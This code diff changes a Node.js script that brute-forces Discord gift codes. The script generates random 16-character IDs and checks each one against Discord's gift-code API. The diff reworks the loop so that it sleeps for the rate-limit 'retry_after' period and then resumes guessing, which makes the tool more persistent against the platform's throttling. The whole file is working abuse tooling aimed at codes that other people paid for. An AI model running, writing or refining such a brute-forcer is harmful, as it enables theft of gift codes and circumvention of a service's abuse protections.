@@ -11,16 +11,17 @@ function makeid(length) {
    return result;
 }
 
-timers.setInterval(function () {
+function checkCode () {
   var id = makeid(16)
   var uri = 'https://discord.com/api/v6/entitlements/gift-codes/' + id
   request(uri, { json: true }, (err, res, body) => {
     if (err) { return console.log(err); }
     if (body.message.includes ("Unknown")) {
       console.warn ("======> [ERR] " + id + " not valid.")
+      timers.setTimeout(checkCode, 10000)
     } else if (body.message.includes ('rate')) {
-      console.warn("======> [WARN] RATE LIMIT! SLEEPING")
-      setTimeout(function () {return}, body.retry_after)
+      console.warn("======> [WARN] You are being rate limited. Sleeping for " + body.retry_after + " ms");
+      timers.setTimeout(checkCode, body.retry_after)
     }
 
     else {
@@ -30,4 +31,6 @@ timers.setInterval(function () {
       process.exit(22);
     }
   });
-}, 10000)
+}
+
+checkCode();
